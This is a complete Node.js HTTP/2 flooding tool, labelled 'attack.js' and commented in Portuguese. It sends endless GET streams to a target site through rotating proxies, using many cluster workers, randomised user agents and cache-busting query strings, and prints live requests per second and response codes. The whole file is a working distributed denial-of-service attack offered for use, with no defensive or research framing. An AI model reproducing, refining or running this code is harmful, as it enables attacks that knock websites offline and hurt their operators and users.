const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ========== CONFIGURAÇÃO ==========
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

// Validação de argumentos
if (!args.target || !args.time || !args.rate || !args.threads || !args.proxyFile) {
    console.log('\x1b[31m[!] Uso correto:\x1b[0m');
    console.log('\x1b[33mnode attack.js <https://target.com> <tempo> <rate> <threads> <proxy.txt>\x1b[0m');
    console.log('\x1b[36mExemplo: node attack.js https://exemplo.com 60 10 32 proxy.txt\x1b[0m');
    process.exit(1);
}

// Parse do target
const parsedTarget = url.parse(args.target);
if (!parsedTarget.host) {
    console.log('\x1b[31m[!] URL inválida!\x1b[0m');
    process.exit(1);
}

// Carregar proxies
let proxies = [];
try {
    const proxyData = fs.readFileSync(args.proxyFile, "utf-8");
    proxies = proxyData.split(/\r?\n/).filter(line => {
        line = line.trim();
        return line.length > 5 && line.includes(':') && !line.startsWith('#');
    });
    
    if (proxies.length === 0) {
        console.log('\x1b[31m[!] Nenhum proxy válido encontrado!\x1b[0m');
        process.exit(1);
    }
    console.log(`\x1b[32m[✓] Carregados ${proxies.length} proxies\x1b[0m`);
} catch (err) {
    console.log(`\x1b[31m[!] Erro ao ler proxy file: ${err.message}\x1b[0m`);
    process.exit(1);
}

// ALPN para HTTP/2
const ALPN_PROTOCOLS = ['h2', 'http/1.1'];

// User Agents variados
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

// ========== MODO MASTER ==========
if (cluster.isMaster) {
    let totalRequests = 0;
    let currentRPS = 0;
    const statusCodes = {};
    const proxyStats = {};
    const startTime = Date.now();
    
    console.clear();
    console.log(`\x1b[36m╔════════════════════════════════════════════════════════════╗\x1b[0m`);
    console.log(`\x1b[36m║              HTTP/2 ATTACK - OPTIMIZED V2                  ║\x1b[0m`);
    console.log(`\x1b[36m╚════════════════════════════════════════════════════════════╝\x1b[0m`);
    console.log(`\x1b[33mTarget:\x1b[0m ${parsedTarget.host}:443`);
    console.log(`\x1b[33mDuration:\x1b[0m ${args.time}s`);
    console.log(`\x1b[33mRate:\x1b[0m ${args.rate} streams/conn`);
    console.log(`\x1b[33mThreads:\x1b[0m ${args.threads}`);
    console.log(`\x1b[33mProxies:\x1b[0m ${proxies.length}\n`);
    
    // Iniciar workers
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
    
    // Receber estatísticas dos workers
    cluster.on('message', (worker, msg) => {
        if (msg.type === 'stats') {
            totalRequests += msg.count;
            currentRPS += msg.count;
            
            if (msg.ip) {
                proxyStats[msg.ip] = (proxyStats[msg.ip] || 0) + msg.count;
            }
            
            if (msg.codes) {
                for (const code in msg.codes) {
                    statusCodes[code] = (statusCodes[code] || 0) + msg.codes[code];
                }
            }
        }
    });
    
    // Reiniciar workers mortos
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
    // Exibir estatísticas a cada segundo
    const statsInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const remaining = Math.max(0, args.time - elapsed);
        
        console.clear();
        console.log(`\x1b[36m╔════════════════════════════════════════════════════════════╗\x1b[0m`);
        console.log(`\x1b[36m║         HTTP/2 ATTACK | Target: ${parsedTarget.host.padEnd(20)}║\x1b[0m`);
        console.log(`\x1b[36m╚════════════════════════════════════════════════════════════╝\x1b[0m`);
        console.log(`\x1b[33mTime:\x1b[0m ${elapsed}s / ${args.time}s | \x1b[33mRemaining:\x1b[0m ${remaining}s`);
        console.log(`\x1b[33m────────────────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[32mTotal Requests:\x1b[0m ${totalRequests.toLocaleString()}`);
        console.log(`\x1b[36mCurrent RPS:\x1b[0m ${currentRPS.toLocaleString()}`);
        console.log(`\x1b[33mAverage RPS:\x1b[0m ${Math.floor(totalRequests / Math.max(1, elapsed)).toLocaleString()}`);
        
        const statusLine = Object.entries(statusCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([code, count]) => `${code}: ${count.toLocaleString()}`)
            .join(' | ');
        console.log(`\x1b[33mStatus Codes:\x1b[0m ${statusLine || 'Aguardando...'}`);
        
        console.log(`\x1b[33m────────────────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[37mTop 5 Proxies:\x1b[0m`);
        Object.entries(proxyStats)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .forEach(([ip, count], idx) => {
                console.log(`  ${idx + 1}. ${ip.padEnd(18)} → ${count.toLocaleString()} reqs`);
            });
        
        const progress = Math.floor((elapsed / args.time) * 40);
        const bar = '█'.repeat(progress) + '░'.repeat(40 - progress);
        console.log(`\x1b[33m────────────────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[36mProgress: [${bar}] ${Math.floor((elapsed / args.time) * 100)}%\x1b[0m`);
        console.log(`\x1b[90mWorkers ativos: ${Object.keys(cluster.workers).length}\x1b[0m`);
        
        currentRPS = 0;
    }, 1000);
    
    // Finalizar ataque
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n\x1b[32m╔════════════════════════════════════════════════════════════╗\x1b[0m`);
        console.log(`\x1b[32m║                    ATAQUE FINALIZADO                       ║\x1b[0m`);
        console.log(`\x1b[32m╚════════════════════════════════════════════════════════════╝\x1b[0m`);
        console.log(`\x1b[33mTotal de requisições:\x1b[0m ${totalRequests.toLocaleString()}`);
        console.log(`\x1b[33mRPS médio:\x1b[0m ${Math.floor(totalRequests / args.time).toLocaleString()}`);
        process.exit(0);
    }, args.time * 1000);
    
} else {
    // ========== MODO WORKER ==========
    let localCount = 0;
    let localCodes = {};
    let currentProxy = '';
    
    // Função para enviar estatísticas
    function sendStats() {
        if (localCount > 0) {
            process.send({
                type: 'stats',
                count: localCount,
                codes: localCodes,
                ip: currentProxy
            });
            localCount = 0;
            localCodes = {};
        }
    }
    
    // Enviar stats a cada segundo
    setInterval(sendStats, 1000);
    
    // Função principal de ataque
    function attack() {
        const proxyLine = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxyLine) return;
        
        const proxyParts = proxyLine.split(':');
        if (proxyParts.length < 2) return;
        
        const proxyHost = proxyParts[0];
        const proxyPort = parseInt(proxyParts[1]);
        currentProxy = proxyHost;
        
        const socket = new net.Socket();
        socket.setTimeout(10000);
        socket.setNoDelay(true);
        
        let isActive = true;
        
        socket.once('connect', () => {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
        });
        
        socket.once('data', (data) => {
            const response = data.toString();
            if (!response.includes('200') && !response.includes('Connection established')) {
                cleanup();
                return;
            }
            
            const tlsSocket = tls.connect({
                socket: socket,
                servername: parsedTarget.host,
                ALPNProtocols: ALPN_PROTOCOLS,
                rejectUnauthorized: false,
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3'
            });
            
            tlsSocket.setKeepAlive(true, 30000);
            
            tlsSocket.once('secureConnect', () => {
                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsSocket,
                    settings: {
                        maxConcurrentStreams: 200,
                        initialWindowSize: 65535,
                        enablePush: false
                    }
                });
                
                client.once('connect', () => {
                    // Função de envio contínuo
                    function sendRequest() {
                        if (client.destroyed || client.closed || !isActive) return;
                        
                        const randomPath = parsedTarget.path + 
                            (parsedTarget.path.includes('?') ? '&' : '?') + 
                            Math.random().toString(36).substring(2, 10) + 
                            '=' + Math.random().toString(36).substring(2, 10);
                        
                        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
                        
                        const req = client.request({
                            ':method': 'GET',
                            ':path': randomPath,
                            ':scheme': 'https',
                            ':authority': parsedTarget.host,
                            'user-agent': userAgent,
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'accept-language': 'pt-BR,pt;q=0.9,en;q=0.8',
                            'accept-encoding': 'gzip, deflate, br',
                            'cache-control': 'no-cache',
                            'pragma': 'no-cache',
                            'upgrade-insecure-requests': '1',
                            'connection': 'keep-alive'
                        });
                        
                        req.on('response', (res) => {
                            const status = res[':status'];
                            localCodes[status] = (localCodes[status] || 0) + 1;
                            localCount++;
                            
                            if (localCount >= 100) {
                                sendStats();
                            }
                            
                            req.close();
                            req.destroy();
                        });
                        
                        req.on('error', () => {
                            req.destroy();
                        });
                        
                        req.end();
                        
                        // Continua enviando sem pausa
                        setImmediate(sendRequest);
                    }
                    
                    // Inicia múltiplos streams simultâneos
                    for (let i = 0; i < args.rate; i++) {
                        sendRequest();
                    }
                });
                
                client.on('error', () => {
                    cleanup();
                });
                
                client.on('close', () => {
                    cleanup();
                });
            });
            
            tlsSocket.on('error', () => {
                cleanup();
            });
        });
        
        socket.on('error', () => {
            cleanup();
        });
        
        socket.on('timeout', () => {
            cleanup();
        });
        
        function cleanup() {
            if (!isActive) return;
            isActive = false;
            sendStats();
            socket.destroy();
        }
    }
    
    // Múltiplas conexões por worker
    const connectionsPerWorker = Math.min(20, Math.floor(200 / args.threads));
    
    for (let i = 0; i < connectionsPerWorker; i++) {
        setTimeout(() => {
            attack();
            // Reconexão automática
            setInterval(() => {
                attack();
            }, 30000);
        }, i * 50);
    }
    
    // Finalizar worker
    setTimeout(() => {
        sendStats();
        process.exit(0);
    }, args.time * 1000);
}
